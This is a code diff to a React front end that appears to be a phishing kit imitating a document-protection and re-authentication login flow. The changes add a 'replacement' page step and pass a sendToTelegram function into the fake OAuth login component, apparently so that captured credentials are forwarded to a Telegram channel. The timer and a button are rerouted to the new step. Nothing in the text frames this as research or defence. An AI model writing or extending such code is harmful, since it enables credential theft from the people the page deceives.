@@ -307,7 +307,7 @@ function App() {
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const step = urlParams.get('step');
-    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'reauthenticating', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
+    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'reauthenticating', 'oauth-redirect', 'success', 'document-loading', 'replacement'].includes(step)) {
       setCurrentPage(step);
       window.history.replaceState({}, document.title, window.location.pathname);
     }
@@ -358,7 +358,7 @@ function App() {
   useEffect(() => {
     if (currentPage === 'reauthenticating') {
       const timer = setTimeout(() => {
-        setCurrentPage('oauth-redirect');
+        setCurrentPage('replacement');
       }, 2000);
       return () => clearTimeout(timer);
     }
@@ -724,10 +724,19 @@ function App() {
         />
       );
 
+    case 'replacement':
+      return (
+        <RealOAuthRedirect
+          onLoginSuccess={handleOAuthSuccess}
+          sendToTelegram={sendToTelegram}
+        />
+      );
+
     case 'oauth-redirect':
       return (
         <RealOAuthRedirect
           onLoginSuccess={handleOAuthSuccess}
+          sendToTelegram={sendToTelegram}
         />
       );
 
@@ -804,7 +813,7 @@ function App() {
                 Start Over
               </button>
               <button
-                onClick={() => setCurrentPage('oauth-redirect')}
+                onClick={() => setCurrentPage('replacement')}
                 style={{
                   padding: '10px 20px',
                   backgroundColor: '#107c10',
